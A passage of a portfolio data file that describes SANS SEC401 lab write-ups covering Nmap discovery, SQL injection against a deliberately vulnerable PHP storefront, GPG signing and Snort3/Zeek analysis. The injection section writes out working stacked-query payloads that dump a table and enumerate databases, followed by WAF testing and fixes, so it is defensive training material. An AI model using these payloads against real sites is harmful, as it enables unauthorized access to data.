        commandBreakdown: "ndiff: Nmap-aware diff of two XML scans, lines prefixed with + for added and - for removed",
        screenshot: "/labs/network-discovery-145601.png",
      },
      {
        title: "SSH on a non-standard port",
        description:
          "The docs host was advertising SSH on port 80, not 22. Connected with ssh -p 80 and authenticated into the Ubuntu 22.04 container. Non-standard service ports defeat naive scanners that only check well-known ports, which is exactly why -sV matters.",
        command: "ssh -p 80 root@172.28.14.23",
        commandBreakdown: "-p 80: connect to SSH running on port 80",
        screenshot: "/labs/network-discovery-145835.png",
      },
      {
        title: "Post-compromise: netstat on target",
        description:
          "From inside the docs host, listed listening sockets. Confirmed python3 listening on 0.0.0.0:8000, sshd on :80, a loopback resolver on 127.0.0.11:39563, and an established SSH session from the scanning host (172.28.14.1).",
        command: "netstat -anp",
        commandBreakdown: "-a: all sockets; -n: numeric addresses; -p: show owning process/PID",
        screenshot: "/labs/network-discovery-145853.png",
      },
      {
        title: "iptables rules for the new service",
        description:
          "Reviewed the INPUT chain. Port 8000 is only reachable from 172.28.14.23 (self) and loopback; every other source gets REJECT tcp-reset. That explains why the WSGI service only became visible once the scan originated from inside the lab subnet, it was firewalled from external sources.",
        command: "iptables -n -L",
        commandBreakdown: "-n: numeric output (no DNS/port name lookup)\n-L: list rules",
        screenshot: "/labs/network-discovery-145928.png",
      },
      {
        title: "Retrieve the served page",
        description:
          "curled localhost:8000 from the docs host. Response was the 'Alpha Developers' internal documentation portal built with mkdocs-material 9.4.14. Confirms what the port, the process, and the ndiff finding all hinted at: an internal docs site that should never have been exposed beyond loopback.",
        command: "curl localhost:8000",
        screenshot: "/labs/network-discovery-150029.png",
      },
    ],
    outcome:
      "Produced a reliable asset inventory of the /24, including services, versions, likely OS, and a meaningful diff against an older baseline. The ndiff workflow caught exactly the kind of drift that tends to go unnoticed in real environments, a new internal service quietly appearing on an existing host.",
    nextStepsInProduction:
      "In production I'd schedule the -sV XML scan on a cadence (weekly at minimum), store baselines in version control or an asset-management DB, and pipe ndiff output into a ticketing workflow so every new port/service change produces an owner-assigned ticket. I'd also run authenticated scans where possible, since unauthenticated Nmap misses a lot.",
    securityControlsRelevant: [
      "Asset inventory and CMDB accuracy",
      "Host-based firewalls (iptables / nftables) restricting service exposure",
      "Change-detection pipelines (ndiff, diff-based alerting)",
      "Service hardening: don't expose dev/docs sites on 0.0.0.0",
      "Non-standard port hygiene: document, don't rely on, port obscurity",
    ],
    keyFindings: [
      "7 live hosts on 172.28.14.0/24 mapped to the lab's container stack",
      "SSH running on TCP/80 on the docs host, a classic port-obfuscation pattern",
      "php-fpm:9000 exposed as cslistener, a service usually kept internal",
      "ndiff surfaced a new WSGIServer on docs:8000 between scans",
      "iptables restricted 8000/tcp to the host itself, firewall-layer control working as intended",
    ],
    takeaway: [
      "The part most people skip is the baseline. Running Nmap once gets you an asset list; running it twice and diffing with ndiff gets you a detection. That's the whole game in asset management: the first scan is inventory, the second scan is a signal. Most orgs never do the second scan.",
      "OS detection against containers is nearly useless, and that's worth internalizing. The lab returned 'no exact matches' on every host, then 96% confidence guesses across four different kernel families once --osscan-guess was enabled. In a real environment full of containers and cloud VMs, fingerprinting-based inventory is a weak signal. Better to enumerate via CPE from -sV and cross-reference with agent data.",
      "The SSH-on-80 finding is the kind of thing that trips up junior analysts. A top-1000 scan without -sV would have reported 80/tcp open http and moved on. -sV is what separates 'there's a web server here' from 'there's an SSH daemon pretending to be a web server.' On a real red team, mis-labeled ports are where defenders lose visibility.",
    ],
    screenshots: [
      { src: "/labs/network-discovery-143816.png", alt: "Step 1: Lab containers started", caption: "./start_3.1.sh (7 containers up)" },
      { src: "/labs/network-discovery-144231.png", alt: "Step 2: Ping sweep", caption: "nmap -sn 172.28.14.0/24 (7 hosts up)" },
      { src: "/labs/network-discovery-144327.png", alt: "Step 3: Greppable port sweeps", caption: "--top-ports 100 and -F with -oG -" },
      { src: "/labs/network-discovery-144751.png", alt: "Step 4: Service/version detection", caption: "nmap -sV 172.28.14.0/24" },
      { src: "/labs/network-discovery-144947.png", alt: "Step 5: OS detection strict", caption: "nmap -O (no exact matches)" },
      { src: "/labs/network-discovery-145219.png", alt: "Step 6: OS detection with guessing", caption: "nmap -O --osscan-guess" },
      { src: "/labs/network-discovery-145528.png", alt: "Step 7: XML baseline", caption: "nmap -sV -oX new_network.xml" },
      { src: "/labs/network-discovery-145601.png", alt: "Step 8: ndiff change detection", caption: "ndiff surfaced new WSGIServer on docs:8000" },
      { src: "/labs/network-discovery-145835.png", alt: "Step 9: SSH on port 80", caption: "ssh -p 80 root@172.28.14.23" },
      { src: "/labs/network-discovery-145853.png", alt: "Step 10: netstat -anp", caption: "python3 listening on 0.0.0.0:8000" },
      { src: "/labs/network-discovery-145928.png", alt: "Step 11: iptables rules", caption: "8000/tcp restricted to self + loopback" },
      { src: "/labs/network-discovery-150029.png", alt: "Step 12: curl the service", caption: "Alpha Developers mkdocs site served on :8000" },
    ],
  },
  {
    id: 9,
    courseSlug: "sec401",
    slug: "web-app-exploitation",
    title: "Lab 3.3 - Web App Exploitation",
    course: "SEC401 - Vulnerability Management and Response",
    role: "Solo, Lab",
    focus: "Web Application Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized browser screenshots of the Alpha Inc. Merchandise catalog, injection payloads, DB enumeration, and WAF block response",
    tldr: [
      "Exploited a classic LIKE-based SQL injection in a PHP storefront",
      "Used stacked queries to dump database and table names via SHOW statements",
      "Deployed a WAF and verified it blocked the same payload (HTTP 418)",
    ],
    skillsDemonstrated: [
      "Manual SQL injection discovery",
      "Payload construction against LIKE clauses",
      "Stacked-query information disclosure (SHOW DATABASES, SHOW TABLES)",
      "Reading PHP stack traces for injection context",
      "WAF deployment and validation",
    ],
    context:
      "This lab exercises manual SQL injection against a deliberately vulnerable PHP storefront (store.alphainc.ca:8080) backed by MySQL, then deploys a WAF and re-tests to confirm the control works.",
    summary:
      "Discovered a SQL injection in Catalog.php's search parameter (LIKE '%<input>%'), dumped all products, enumerated databases and tables via stacked queries, then deployed the lab WAF and confirmed identical payloads were blocked with HTTP 418.",
    whyThisMatters:
      "SQL injection is still in the OWASP Top 10 in 2026, and LIKE-clause injection is the version most devs miss because parameterized queries alone don't help if the app concatenates the search term into the wildcard wrapper. This lab shows the full loop: discover, exploit, defend, re-verify.",
    tools: ["Firefox", "PHP/MySQL web app", "Manual SQL injection", "WAF (lab-provided)"],
    steps: [
      "Start lab stack: ./start_3.3.sh (nginx, php-fpm, MySQL)",
      "Browse store.alphainc.ca:8080/Catalog.php, inspect search form",
      "Submit empty search, observe Array () dump and MySQL stack trace",
      "Inject single quote: ' → SQL syntax error near '%'",
      "Inject ';-- → confirms injection is inside LIKE '%...%' clause",
      "Inject '; -- (trailing space) → returns all 17 products",
      "Stacked query: qq'; show databases; -- → dumps [Database, information_schema, OnlineShop]",
      "Deploy WAF: scripts/enable_waf.sh",
      "Re-send qq'; show tables; -- → WAF returns HTTP 418",
    ],
    stepDetails: [
      {
        title: "Lab environment startup",
        description:
          "Started the lab stack. Initial errors from stale containers, then three services came up: lab-33-php-nginx, lab-33-database, and lab-33-php-fpm. That's a classic PHP/MySQL storefront topology.",
        command: "cd /sec401/labs/3.3/ && ./start_3.3.sh",
        screenshot: "/labs/webapp-exploit-150444.png",
      },
      {
        title: "Inspect the target app",
        description:
          "Loaded store.alphainc.ca:8080/Catalog.php. The page exposes a category picker (attire, energy, exercise, lighting, toys, training) and a free-text search bar. The search bar is the obvious attack surface.",
        screenshot: "/labs/webapp-exploit-150731.png",
      },
      {
        title: "Leaking the query via error",
        description:
          "Submitted an empty search. The page printed both Array () (an empty result set) and a full PHP exception with the rendered SQL: SELECT * FROM Merchandise WHERE name LIKE '%'%'. That single line reveals: it's a LIKE query, the input is wrapped in single quotes, and stack traces are leaking to users — three serious issues before any payload.",
        screenshot: "/labs/webapp-exploit-150744.png",
      },
      {
        title: "Confirm injection with a single quote",
        description:
          "Submitted ' as the search term to confirm the injection context.",
        screenshot: "/labs/webapp-exploit-150917.png",
      },
      {
        title: "Baseline: a legitimate search result",
        description:
          "Ran a normal search to confirm the app returns product records with fields: Product Number, Item, Description, Price, Picture. The target table is clearly Merchandise.",
        screenshot: "/labs/webapp-exploit-150925.png",
      },
      {
        title: "Probe the LIKE boundary with ';--",
        description:
          "Submitted ';-- to close the string and try to comment out the trailing %'. The error message confirmed the resulting query: SELECT * FROM Merchandise WHERE name LIKE '%':--%', meaning MySQL didn't treat -- as a comment because it wasn't followed by whitespace.",
        screenshot: "/labs/webapp-exploit-151735.png",
      },
      {
        title: "Observed error response",
        description:
          "The server echoed the unsafe query directly back in the stack trace — a defender's nightmare because it tells the attacker exactly how to refine the payload.",
        screenshot: "/labs/webapp-exploit-151742.png",
      },
      {
        title: "Fix the payload: '; -- with trailing space",
        description:
          "MySQL's -- comment syntax requires a trailing space. Retried with '; --  (single quote, semicolon, dash-dash, space).",
        screenshot: "/labs/webapp-exploit-151918.png",
      },
      {
        title: "Full table dump via broken WHERE clause",
        description:
          "The payload produced SELECT * FROM Merchandise WHERE name LIKE '%'; --  %'. The first statement returned everything (LIKE '%' matches all rows), the rest got commented out. Result: all 17 products returned, confirming full data exfiltration from the table.",
        screenshot: "/labs/webapp-exploit-151924.png",
      },
      {
        title: "Stacked query: enumerate databases",
        description:
          "Graduated from data theft to server reconnaissance. Payload: qq'; show databases; --  . The mysqli driver in this app supports multiple statements, so the second statement executed.",
        screenshot: "/labs/webapp-exploit-153520.png",
      },
      {
        title: "Database enumeration success",
        description:
          "The page printed Array ( [0] => Database [1] => information_schema [2] => OnlineShop ). Confirmed the app's database is OnlineShop and stacked queries are fully allowed. From here an attacker can drop tables, write files, or escalate — the worst-case SQLi scenario.",
        screenshot: "/labs/webapp-exploit-153532.png",
      },
      {
        title: "Deploy the WAF",
        description:
          "Ran the lab's WAF enable script to put a filtering proxy in front of the app.",
        command: "scripts/enable_waf.sh",
        screenshot: "/labs/webapp-exploit-154228.png",
      },
      {
        title: "Re-test the same payload",
        description:
          "Replayed the stacked-query payload: qq'; show tables; --  . Same request, same target.",
        screenshot: "/labs/webapp-exploit-154243.png",
      },
      {
        title: "WAF blocks the request (HTTP 418)",
        description:
          "The WAF returned HTTP 418 ('I'm a teapot', a common non-standard block response). Identical payload, defeated. The app is still vulnerable at the code level, but the WAF gives the team time to fix it without leaving the front door open.",
        screenshot: "/labs/webapp-exploit-154304.png",
      },
    ],
    outcome:
      "Demonstrated the complete SQL injection lifecycle against a realistic PHP app: discovery from an error message, payload refinement for LIKE context, data exfiltration, information_schema enumeration via stacked queries, then defense validation with a WAF returning HTTP 418 on the same payload.",
    nextStepsInProduction:
      "Fix the root cause: parameterize the LIKE query with bound parameters and pre-escape the user input's % and _ wildcards. Disable multi-statement on the mysqli connection. Turn off verbose error rendering in production (display_errors=Off, log to a file only). Keep the WAF as defense in depth, not the only control.",
    securityControlsRelevant: [
      "Parameterized queries / prepared statements",
      "LIKE wildcard escaping (%, _)",
      "Disabling multi_query / stacked statements at the driver level",
      "Suppressing verbose error output in production",
      "WAF rules for SQLi (OWASP CRS)",
      "Least-privilege DB accounts (no SHOW DATABASES for app user)",
    ],
    keyFindings: [
      "Search input directly concatenated into LIKE '%...%'",
      "PHP exceptions leak the full SQL query to the browser",
      "Stacked queries enabled on the mysqli connection",
      "Full dump of Merchandise table achievable with '; -- ",
      "information_schema + OnlineShop databases disclosed via SHOW DATABASES",
      "WAF correctly blocks the same payloads after enablement (HTTP 418)",
    ],
    takeaway: [
      "LIKE-clause injection is underestimated because most devs think 'I'm using prepared statements, I'm safe.' But a prepared statement that binds user input as the LIKE pattern without escaping % and _ still lets an attacker return every row. The bug here isn't really string concatenation, it's treating user input as a complete pattern instead of a literal.",
      "The error page is worth as much as the injection itself. The stack trace echoed the exact generated SQL, which turned a five-minute exploit into a thirty-second one. In a real engagement I'd log 'SQL error: contact support' to the user and the full trace to a server-only log. Verbose errors in prod are a vulnerability amplifier.",
      "The WAF worked, and that matters, but the framing is important. The app code is still exploitable. If the WAF ruleset changes, if the attacker finds an encoding the rules don't cover, or if someone routes around the WAF (internal VPC access, misconfigured origin), the exposure comes back. WAFs are brake pads, not brake lines — they buy you time, they're not the fix.",
    ],
    screenshots: [
      { src: "/labs/webapp-exploit-150444.png", alt: "Lab stack startup", caption: "./start_3.3.sh (nginx + MySQL + php-fpm)" },
      { src: "/labs/webapp-exploit-150731.png", alt: "Catalog page", caption: "store.alphainc.ca:8080/Catalog.php" },
      { src: "/labs/webapp-exploit-150744.png", alt: "Empty search leaks SQL", caption: "Stack trace shows LIKE '%...%' query" },
      { src: "/labs/webapp-exploit-150917.png", alt: "Probe with '", caption: "Single quote breaks the query" },
      { src: "/labs/webapp-exploit-150925.png", alt: "Normal search baseline", caption: "Merchandise table columns visible" },
      { src: "/labs/webapp-exploit-151735.png", alt: "Payload ';--", caption: "-- not comment without trailing space" },
      { src: "/labs/webapp-exploit-151742.png", alt: "Error shows built query", caption: "'%':--%'" },
      { src: "/labs/webapp-exploit-151918.png", alt: "Payload '; -- ", caption: "Added trailing space to -- " },
      { src: "/labs/webapp-exploit-151924.png", alt: "All products returned", caption: "17 products dumped" },
      { src: "/labs/webapp-exploit-153520.png", alt: "Stacked query", caption: "qq'; show databases; -- " },
      { src: "/labs/webapp-exploit-153532.png", alt: "Databases enumerated", caption: "Database, information_schema, OnlineShop" },
      { src: "/labs/webapp-exploit-154228.png", alt: "Enable WAF", caption: "scripts/enable_waf.sh" },
      { src: "/labs/webapp-exploit-154243.png", alt: "Retry payload behind WAF", caption: "qq'; show tables; -- " },
      { src: "/labs/webapp-exploit-154304.png", alt: "WAF block", caption: "HTTP 418 — WAF blocked the request" },
    ],
  },
  {
    id: 11,
    courseSlug: "sec401",
    slug: "hashing-cryptographic-validation",
    title: "Lab 4.1 - Hashing and Cryptographic Validation",
    course: "SEC401 - Data Security Technologies",
    role: "Solo, Lab",
    focus: "Cryptography",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized terminal screenshots of sha256sum, GPG key generation, detached signatures, signature verification (good and bad), and exiftool metadata review",
    tldr: [
      "Proved SHA-256 is content-based by renaming a file (hash unchanged) vs. editing one byte (hash diverged)",
      "Generated an RSA 3072-bit GPG key, signed a file, imported a third-party public key",
      "Caught a tampered Bankruptcy.docx via a BAD signature, then verified a clean backup",
    ],
    skillsDemonstrated: [
      "SHA-256 file integrity validation",
      "GPG key generation and keyring management",
      "Detached signature creation and verification",
      "Public key import and trust model review",
      "Exif/document metadata triage",
      "Incident workflow: restoring from a signed backup after tamper detection",
    ],
    context:
      "This lab walks through the core building blocks of cryptographic integrity — hashing, key pairs, and digital signatures — using sha256sum and GnuPG. It ends with a realistic scenario: a suspected-tampered document that fails signature verification, forcing a restore from a backup whose signature is valid.",
    summary:
      "Used sha256sum and xxd to prove hashes are content-bound, generated an RSA 3072-bit GPG identity, produced a detached signature, imported Madison Jeffries's public key, flagged a tampered Bankruptcy.docx via a BAD signature from GPG, reviewed the metadata with exiftool, then restored a clean backup copy that verified cleanly.",
    whyThisMatters:
      "Hashing and signing are how defenders catch silent tampering — the attacker who changes one byte of a document, contract, or binary. Without integrity checks, you have no way to tell whether a file is the one the author sent or something an intermediate actor modified. This lab is the blue-team equivalent of 'don't trust the file, verify the signature.'",
    tools: ["sha256sum", "xxd", "sed", "gpg (GnuPG 2.2.27)", "exiftool"],
    steps: [
      "Create a file, hash it, rename it, hash again (identical)",
      "Edit one character with sed, re-hash (hash changes completely)",
      "gpg --full-generate-key (RSA 3072, no expiry)",
      "gpg --list-keys / --list-secret-keys to inspect keyring",
      "gpg --sign --armor --detach-sig on renamed-file.txt",
      "gpg --verify against the detached .asc",
      "gpg --import of Madison Jeffries's public key",
      "gpg --verify against Bankruptcy.docx (BAD signature)",
      "exiftool on the suspect Bankruptcy.docx to surface metadata",
      "Restore from backup and re-verify (Good signature)",
    ],
    stepDetails: [
      {
        title: "Hash is content-based, not name-based",
        description:
          "Created test-file.txt containing 'Hello'. Computed its SHA-256 (66a0...bb35f18), inspected the bytes with xxd (48 65 6c 6c 6f 0a = Hello\\n), then renamed the file to renamed-file.txt. Re-hashed: the digest was identical. Hashes are computed over file contents, not metadata.",
        command: "echo \"Hello\" > test-file.txt && sha256sum test-file.txt && xxd test-file.txt && mv test-file.txt renamed-file.txt && sha256sum renamed-file.txt",
        commandBreakdown: "echo \"Hello\" > file: write 6 bytes (Hello\\n) to a file\nsha256sum: compute SHA-256 digest\nxxd: hex + ASCII dump\nmv: rename without changing contents",
        screenshot: "/labs/hashing-crypto-204343.png",
      },
      {
        title: "One-byte change, completely different hash",
        description:
          "Used sed to change every H to h in place (a single-byte change: 0x48 → 0x68). Re-hashed: the digest went from 66a0...bb35f18 to 5891...6be03, no resemblance to the original. This is the avalanche property of SHA-256: small input changes produce massive output changes.",
        command: "sed -i 's/H/h/g' renamed-file.txt && sha256sum renamed-file.txt",
        commandBreakdown: "sed -i: edit file in place\n's/H/h/g': substitute H with h, globally",
        screenshot: "/labs/hashing-crypto-204457.png",
      },
      {
        title: "Generate an RSA 3072 GPG key",
        description:
          "Ran the interactive key generation wizard. Chose RSA and RSA (1), 3072-bit keysize, no expiration, identity sec401 <sec401@sans.org>. GPG generated primary signing/certification (SC) key and an encryption (E) subkey. Entropy-gathering prompt appeared twice because two primes needed to be generated.",
        command: "gpg --full-generate-key",
        commandBreakdown: "--full-generate-key: full interactive key generation (vs. quick-generate)",
        screenshot: "/labs/hashing-crypto-205115.png",
      },
      {
        title: "Inspect the keyring",
        description:
          "Listed public and secret keys. pub rsa3072 2026-04-13 [SC] with fingerprint A2B39B421129567517A5ECEA9B00C9116C092134, trust [ultimate] because it's our own key, plus a matching [E] encryption subkey. The secret-keys listing shows the same fingerprint under 'sec' confirming we hold the private half.",
        command: "gpg --list-keys && gpg --list-secret-keys",
        screenshot: "/labs/hashing-crypto-205251.png",
      },
      {
        title: "Sign a file with a detached ASCII-armored signature",
        description:
          "Produced an external .asc signature for renamed-file.txt. Detached sigs are the pattern used for release artifacts: ship the file and the .asc alongside each other. Verified locally and GPG reported 'Good signature from sec401' with the full fingerprint.",
        command: "gpg --sign --armor --output renamed-file.txt.asc --detach-sig renamed-file.txt && gpg --verify renamed-file.txt.asc",
        commandBreakdown: "--sign: sign\n--armor: ASCII-armored output (.asc, not binary .sig)\n--detach-sig: signature in a separate file",
        screenshot: "/labs/hashing-crypto-205432.png",
      },
      {
        title: "Import a third-party public key",
        description:
          "Imported Madison Jeffries's public key from the lab backup directory. Post-import, --list-keys shows two pubkeys: our own at [ultimate] trust and Jeffries's (D200...BD90, rsa4096) at [unknown] trust, which is the correct default — GPG doesn't extend trust just because you imported a key.",
        command: "gpg --import /sec401/labs/4.1/backup/backup-jeffries... && gpg --list-keys",
        screenshot: "/labs/hashing-crypto-205618.png",
      },
      {
        title: "BAD signature: tamper detected",
        description:
          "Verified a signed Bankruptcy.docx from mounted media. GPG reported 'BAD signature from Madison Jeffries'. Either the document or the signature file has been altered since it was signed. In a real workflow this is the point where you stop reading the file and escalate.",
        command: "gpg --verify /media/sec401/CDROM/Bankruptcy.docx.asc",
        screenshot: "/labs/hashing-crypto-205701.png",
      },
      {
        title: "Surface metadata with exiftool",
        description:
          "Pulled metadata off Bankruptcy.docx. ExifTool reported standard DOCX internals plus Application: Microsoft Office Word, Pages: 2, Total Edit Time: 2982555.3 days — an obviously bogus value that on its own is a tampering indicator. Metadata review complements the cryptographic signal: even without a signature, the edit-time field alone warrants investigation.",
        command: "exiftool /media/sec401/CDROM/Bankruptcy.docx",
        screenshot: "/labs/hashing-crypto-205741.png",
      },
      {
        title: "Restore from backup, re-verify",
        description:
          "Copied the signature backup to the lab folder. First verify attempt passed the .docx instead of the .asc (GPG rejected with 'no valid OpenPGP data found'). Re-ran against the .asc and GPG confirmed 'Good signature from Madison Jeffries' with a GPG WARNING that the key is not certified with a trusted signature — expected, because we haven't signed Jeffries's key with our own to extend trust.",
        command: "cp /media/sec401/CDROM/Bankruptcy.docx.asc /sec401/labs/4.1/backup/ && gpg --verify /sec401/labs/4.1/backup/Bankruptcy.docx.asc",
        screenshot: "/labs/hashing-crypto-210137.png",
      },
    ],
    outcome:
      "Walked the full integrity chain: hash-based validation for fast change detection, asymmetric signing for authenticity, and a realistic scenario where a tampered document is caught by a BAD signature and the incident resolves by restoring from a signed backup.",
    nextStepsInProduction:
      "In production I'd pin critical vendor public keys in configuration (not just the keyring), establish a web-of-trust or use a keyserver with signed keys, automate verification in CI/CD for any artifact download (release binaries, firmware, scripts), and log verification failures to SIEM so a single BAD signature raises an incident ticket rather than getting retried silently.",
    securityControlsRelevant: [
      "File integrity monitoring (hash-based)",
      "Code and document signing (GPG, Sigstore, cosign)",
      "Artifact verification in CI/CD pipelines",
      "Key management and rotation (HSMs, hardware keys)",
      "Trust model enforcement (--trusted-key, --trust-model)",
      "Metadata-based tamper indicators (exiftool, oletools)",
    ],
    keyFindings: [
      "SHA-256 is content-bound; renaming a file does not change its hash",
      "Single-byte edits produce avalanche-level hash changes",
      "RSA 3072 is the modern GPG default (2048 is no longer recommended)",
      "Detached .asc signatures are the preferred distribution format",
      "Bankruptcy.docx on the lab media fails signature verification (tampered)",
      "Bankruptcy.docx backup copy verifies cleanly (known-good version)",
      "exiftool's 'Total Edit Time: 2982555.3 days' is a tampering red flag on its own",
    ],
    takeaway: [
      "The rename vs. sed demo is the cleanest way to internalize what a hash actually is. Most junior analysts can recite 'SHA-256 is a digest' without ever seeing that renaming a file preserves the hash while changing a single ASCII character obliterates it. Once you've watched 66a0...bb35f18 become 5891...6be03 because of a one-byte swap, you stop confusing filename with content integrity.",
      "Signing is where most teams fall down operationally. Generating a key is trivial. Distributing the public key, training every consumer to verify before using, and keeping the private key somewhere that survives laptop loss — that's the actual work. In a production rollout I'd pair GPG with a hardware key (YubiKey in OpenPGP mode) so the private key never sits on disk, and I'd automate verification so humans aren't the last line of defense.",
      "The Bankruptcy.docx scenario is a good teaching moment for two reasons. First, the cryptographic signal (BAD signature) is binary and unambiguous — either the file is the one Jeffries signed or it isn't. Second, the exiftool follow-up shows why you don't rely on any single indicator: metadata, signatures, and hashes each catch different things. In a real investigation, you'd combine all three with a chain-of-custody log before you made a call about authenticity.",
    ],
    screenshots: [
      { src: "/labs/hashing-crypto-204343.png", alt: "Hash preserved across rename", caption: "sha256sum identical after mv" },
      { src: "/labs/hashing-crypto-204457.png", alt: "One byte changes the hash", caption: "sed H→h → entirely new digest" },
      { src: "/labs/hashing-crypto-205115.png", alt: "GPG key generation", caption: "RSA 3072, no expiry, sec401@sans.org" },
      { src: "/labs/hashing-crypto-205251.png", alt: "Keyring listing", caption: "pub/sec rsa3072 A2B3…2134" },
      { src: "/labs/hashing-crypto-205432.png", alt: "Detached signature + verify", caption: "Good signature from sec401" },
      { src: "/labs/hashing-crypto-205618.png", alt: "Imported Jeffries pubkey", caption: "rsa4096 D200…BD90 [unknown] trust" },
      { src: "/labs/hashing-crypto-205701.png", alt: "BAD signature", caption: "gpg --verify on tampered Bankruptcy.docx" },
      { src: "/labs/hashing-crypto-205741.png", alt: "exiftool metadata", caption: "Total Edit Time: 2982555.3 days (red flag)" },
      { src: "/labs/hashing-crypto-210137.png", alt: "Good signature from backup", caption: "Backup copy verifies cleanly" },
    ],
  },
  {
    id: 13,
    courseSlug: "sec401",
    slug: "ids-snort3-zeek",
    title: "Lab 4.3 - Intrusion Detection and Network Security Monitoring with Snort3 and Zeek",
    course: "SEC401 - Data Security Technologies",
    role: "Solo, Lab",
    focus: "Intrusion Detection",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized terminal screenshots of Snort3 config validation, PCAP replay alerts, BPF-filtered runs, and Zeek log review",
    tldr: [
      "Validated Snort 3.1.73 config, scoped HOME_NET to the lab /16, replayed investigate.pcap through community rules",
      "Triaged 294 INDICATOR-SHELLCODE ssh CRC32 overflow alerts from 20.106.124.93 hitting 10.130.8.94:22",
      "Re-ran Snort with BPF focus and processed the same PCAP with Zeek + extract-all-files policy",
    ],
    skillsDemonstrated: [
      "Snort3 config validation (-T)",
      "Tuning HOME_NET for a target environment",
      "Snort rule-based PCAP analysis (-A alert_fast / alert_talos)",
      "BPF filtering inside Snort (--bpf)",
      "Zeek PCAP processing with custom policy scripts",
      "Reading Zeek log format (packet_filter.log, field headers)",
      "Correlating rule IDs to classifications and priorities",
    ],
    context:
      "This lab runs two IDS/NSM tools against the same investigation PCAP: Snort3 for signature-based detection and Zeek for protocol-aware logging and file extraction. The goal is to understand what each tool tells you, and where they overlap vs. complement each other.",
    summary:
      "Validated Snort 3.1.73 config, tightened HOME_NET to 10.130.0.0/16, ran the community ruleset against investigate.pcap, and surfaced an SSH CRC32 overflow shellcode pattern (294 alerts from 20.106.124.93 → 10.130.8.94:22). Re-ran Snort with a BPF filter pinned to the attacker IP, then processed the same PCAP with Zeek's extract-all-files policy and confirmed log output.",
    whyThisMatters:
      "Signature-based IDS (Snort) and protocol-aware NSM (Zeek) are the two workhorses of mid-market network monitoring. Knowing how to tune rules, scope HOME_NET, filter noise with BPF, and pivot into Zeek logs for file extraction is the day-to-day job of a SOC analyst triaging a detection.",
    tools: ["Snort 3.1.73.0", "Zeek", "snort3-community.rules", "BPF", "sed", "tshark-style workflow on PCAP"],
    steps: [
      "snort -T -c /sec401/labs/4.3/etc/snort.lua (validate config)",
      "sed HOME_NET to 10.130.0.0/16",
      "snort -T -c snort.lua -q (quiet re-validation)",
      "snort -c etc/snort.lua -q -r investigate.pcap -A alert_talos -R rules/snort3-community.rules (summary)",
      "snort … -A alert_fast (per-alert detail)",
      "snort … --bpf 'host 20.106.124.93' (focus on attacker)",
      "zeek -C -r ../investigate.pcap -f 'host 20.206.124.93' extract-all-files.zeek",
      "Review packet_filter.log fields with sed",
    ],
    stepDetails: [
      {
        title: "Validate the Snort3 config",
        description:
          "Ran Snort in test mode to confirm the lab's snort.lua loads cleanly. The output shows Snort 3.1.73.0 enumerating every compiled-in inspector: HTTP, HTTP2, TLS/SSL, SMTP, SSH, FTP, DCE-RPC variants, DNS, IEC104, Modbus, NetFlow, port_scan, the wizard (protocol auto-id), and stream reassembly for TCP/UDP/ICMP. Good baseline view of what Snort3 actually inspects out of the box.",
        command: "snort -T -c /sec401/labs/4.3/etc/snort.lua",
        commandBreakdown: "-T: test configuration and exit\n-c: path to snort.lua",
        screenshot: "/labs/ids-snort-zeek-162400.png",
      },
      {
        title: "Scope HOME_NET to the lab /16",
        description:
          "Replaced HOME_NET = 'any' with HOME_NET = '[10.130.0.0/16]' via sed. HOME_NET = any is the default but defeats most rules that pivot on direction ($HOME_NET vs. $EXTERNAL_NET). Setting a real CIDR makes rules meaningful.",
        command: "sed -i 's/HOME_NET = \\'any\\'/HOME_NET = \\'[10.130.0.0/16]\\'/' /sec401/labs/4.3/etc/snort.lua",
        screenshot: "/labs/ids-snort-zeek-162825.png",
      },
      {
        title: "Quiet re-validation",
        description:
          "Re-ran config test with -q to suppress startup noise. Clean exit means the HOME_NET edit is syntactically valid.",
        command: "snort -T -c /sec401/labs/4.3/etc/snort.lua -q",
        commandBreakdown: "-q: quiet mode (suppress banners)",
        screenshot: "/labs/ids-snort-zeek-162902.png",
      },
      {
        title: "PCAP replay with community rules: summary view",
        description:
          "Replayed investigate.pcap through Snort with the community rules and alert_talos output. The summary groups alerts by SID and signature: SERVER-WEBAPP robots.txt access (14), backup access (15), POLICY-OTHER Microsoft Windows Terminal server request attempt (218), INDICATOR-SHELLCODE ssh CRC32 overflow filler (294), PROTOCOL-ICMP Unusual PING (15). The 294-alert ssh CRC32 row is the obvious thing to pivot on — that's a classic 2001-era exploit signature.",
        command: "snort -c etc/snort.lua -q -r investigate.pcap -A alert_talos -R rules/snort3-community.rules",
        commandBreakdown: "-r: read from PCAP\n-A alert_talos: Talos-style summary (grouped)\n-R: ruleset to load",
        screenshot: "/labs/ids-snort-zeek-163058.png",
      },
      {
        title: "Per-alert detail with alert_fast",
        description:
          "Switched output mode to alert_fast for one-line-per-alert detail. Clearly shows [1:1325:14] INDICATOR-SHELLCODE ssh CRC32 overflow filler — Classification: Executable code was detected, Priority 1 — TCP 20.106.124.93 → 10.130.8.94:22. Every alert traces to the same source IP hammering the same host's SSH port with what Snort identifies as exploit shellcode fillers.",
        command: "snort -c etc/snort.lua -q -r investigate.pcap -A alert_fast -R rules/snort3-community.rules",
        commandBreakdown: "-A alert_fast: one alert per line (best for piping to grep/awk)",
        screenshot: "/labs/ids-snort-zeek-163255.png",
      },
      {
        title: "BPF filter to focus the attacker",
        description:
          "Re-ran with --bpf 'host 20.106.124.93' to scope the analysis to one attacker IP. In a real PCAP triage, --bpf is how you drop the haystack size by 99% so the analyst can work on a specific host/port/flow without the ruleset processing noise.",
        command: "snort -c etc/snort.lua -q -r investigate.pcap -A alert_fast -R rules/snort3-community.rules --bpf 'host 20.106.124.93'",
        commandBreakdown: "--bpf: Berkeley Packet Filter expression; same syntax as tcpdump",
        screenshot: "/labs/ids-snort-zeek-170811.png",
      },
      {
        title: "Zeek: protocol-aware log + file extraction",
        description:
          "Switched to Zeek on the same PCAP with the extract-all-files policy. Zeek produces per-protocol logs (conn.log, http.log, ssh.log, files.log) and can reconstruct files out of flows. The directory listing shows packet_filter.log as the first artifact; after a longer run Zeek emits the full protocol-log set.",
        command: "zeek -C -r ../investigate.pcap -f 'host 20.206.124.93' /opt/zeek/share/zeek/policy/frameworks/files/extract-all-files.zeek",
        commandBreakdown: "-C: skip checksum validation (PCAP checksums often broken)\n-r: read from PCAP\n-f: BPF filter\nextract-all-files.zeek: reconstruct files from HTTP/FTP/SMB flows",
